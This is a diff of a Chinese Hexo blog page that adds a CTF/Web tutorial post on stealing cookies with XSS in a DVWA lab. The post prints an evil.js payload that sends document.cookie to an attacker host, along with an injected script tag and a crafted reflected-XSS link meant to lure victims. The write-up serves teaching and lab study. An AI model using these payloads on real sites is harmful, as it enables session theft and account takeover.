@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="Xss," />
 
 
 
@@ -81,13 +81,21 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="lalala&#39;s blog">
-<meta property="og:url" content="http://yoururl.com/tags/沙箱逃逸/index.html">
+<meta name="description" content="如果web应用在用户输入的地方没有过滤特殊字符，比如&amp;lt;, &amp;gt;, ‘, “, &amp;lt; script&amp;gt;, javascript 等字符，而且在变量输出的地方没有使用安全的编码函数，比如PHP的htmlentities()和htmlspecialchars()函数，JavaScript中的escapeJavascript函数，这样的web应用极易出现XSS漏洞。XSS攻击的危害主要有">
+<meta name="keywords" content="Xss">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS打cookie">
+<meta property="og:url" content="http://yoururl.com/2018/08/07/XSS打cookie/index.html">
 <meta property="og:site_name" content="lalala&#39;s blog">
+<meta property="og:description" content="如果web应用在用户输入的地方没有过滤特殊字符，比如&amp;lt;, &amp;gt;, ‘, “, &amp;lt; script&amp;gt;, javascript 等字符，而且在变量输出的地方没有使用安全的编码函数，比如PHP的htmlentities()和htmlspecialchars()函数，JavaScript中的escapeJavascript函数，这样的web应用极易出现XSS漏洞。XSS攻击的危害主要有">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoururl.com/images/pasted-316.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-317.png">
+<meta property="og:updated_time" content="2018-10-18T11:45:30.929Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="lalala&#39;s blog">
+<meta name="twitter:title" content="XSS打cookie">
+<meta name="twitter:description" content="如果web应用在用户输入的地方没有过滤特殊字符，比如&amp;lt;, &amp;gt;, ‘, “, &amp;lt; script&amp;gt;, javascript 等字符，而且在变量输出的地方没有使用安全的编码函数，比如PHP的htmlentities()和htmlspecialchars()函数，JavaScript中的escapeJavascript函数，这样的web应用极易出现XSS漏洞。XSS攻击的危害主要有">
+<meta name="twitter:image" content="http://yoururl.com/images/pasted-316.png">
 
 
 
@@ -117,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="http://yoururl.com/tags/沙箱逃逸/"/>
+  <link rel="canonical" href="http://yoururl.com/2018/08/07/XSS打cookie/"/>
 
 
 
 
 
-  <title>标签: 沙箱逃逸 | lalala's blog</title>
+  <title>XSS打cookie | lalala's blog</title>
   
 
 
@@ -142,7 +150,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -268,54 +276,190 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>沙箱逃逸<small>标签</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoururl.com/2018/08/07/XSS打cookie/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lalala">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/lalala">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lalala's blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2018/10/18/Python沙箱逃逸（CTF）/" itemprop="url">
-              
-                <span itemprop="name">Python沙箱逃逸（CTF）</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">XSS打cookie</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-10-18T18:31:00+08:00"
-              content="2018-10-18" >
-          10-18
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-07T01:55:00+08:00">
+                2018-08-07
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/Web/" itemprop="url" rel="index">
+                    <span itemprop="name">Web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>如果web应用在用户输入的地方没有过滤特殊字符，比如&lt;, &gt;, ‘, “, &lt; script&gt;, javascript 等字符，而且在变量输出的地方没有使用安全的编码函数，比如PHP的htmlentities()和htmlspecialchars()函数，JavaScript中的escapeJavascript函数，这样的web应用极易出现XSS漏洞。XSS攻击的危害主要有盗取用户cookie、跳转到恶意网站等，危害巨大，常年居Owasp top 10前三。  </p>
+<p>为了理解XSS盗取cookie的原理，进行实验。实验需准备：<br>1）两台主机，主机A（IP地址为IPa）的用户正在浏览具有XSS的网站，主机B（IP地址为IPb）运行着攻击者的恶意代码。<br>(2)DVWA安全等级设为low，充当具有XSS漏洞的网站。<br>攻击者先上传一个JavaScript脚本到主机B上，即xss payload，这段脚本命名为evil.js，可以这样写：  </p>
+<pre><code>var img = document.createElement(&quot;img&quot;);
+img.src = &quot;http://IPb/log?&quot;+escape(document.cookie);
+document.body.appendChild(img);
+</code></pre><p>这段代码将document.cookie作为对象传到主机B上。<a href="http://IPb/log可以存在，也可以不存在，因为这个请求会在主机B的服务器日志中留下日志。" target="_blank" rel="noopener">http://IPb/log可以存在，也可以不存在，因为这个请求会在主机B的服务器日志中留下日志。</a>  </p>
+<p>主机A打开DVWA网站的XSS选项，在what’s your name输入框输入：&lt;script src=<a href="http://IPb/evil.js" target="_blank" rel="noopener">http://IPb/evil.js</a> &gt;并提交：<br><img src="\images\pasted-316.png" alt="upload successful"><br>此时主机A的cookie值就会发送到主机B上，查看主机B的web日志：<br>发现主机A的cookie值已经存在web日志里了。<br><img src="\images\pasted-317.png" alt="upload successful"><br>虽然是实验，但是如果DVWA有XSS漏洞，而攻击者构造一个<a href="http://IP/DVWA/vulnerabilities/xss_r/?name=%3Cscript+src%3Dhttp%3A%2F%2FIPb%2Fevil.js+%3E%3C%2Fscript%3E#" target="_blank" rel="noopener">http://IP/DVWA/vulnerabilities/xss_r/?name=%3Cscript+src%3Dhttp%3A%2F%2FIPb%2Fevil.js+%3E%3C%2Fscript%3E#</a> ，诱骗了用户点击，那么用户的cookie就会发到主机B上，攻击者就可以登录受害者的账户了。</p>
 
       
     </div>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Xss/" rel="tag"># Xss</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/05/西门子PLC指令表/" rel="next" title="西门子PLC指令表">
+                <i class="fa fa-chevron-left"></i> 西门子PLC指令表
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/10/16/Linux内核漏洞利用/" rel="prev" title="Linux内核漏洞利用">
+                Linux内核漏洞利用 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -323,6 +467,13 @@
 
 
           
+  <div class="comments" id="comments">
+    
+         <div id="uyan_frame"></div>
+
+    
+  </div>
+
 
         </div>
         
@@ -580,6 +731,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
@@ -605,6 +760,11 @@
   
     
 
+    
+      <!-- UY BEGIN -->
+	<div id="uyan_frame"></div>
+	<script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2160339"></script>
+	<!-- UY END -->
     
   
 
